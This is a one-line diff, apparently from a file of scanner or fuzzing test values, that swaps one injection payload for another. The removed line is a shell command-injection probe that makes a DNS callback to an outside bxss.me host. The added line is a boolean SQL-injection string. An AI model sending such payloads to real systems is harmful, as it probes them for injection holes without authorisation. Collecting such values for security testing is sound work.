@@ -1,1 +1,1 @@
-&nslookup -q=cname hitvnligunbjy399ac.bxss.me&'\"`0&nslookup -q=cname hitvnligunbjy399ac.bxss.me&`'
+-1' OR 2+910-910-1=0+0+0+1 or 'bNXJuHo8'='
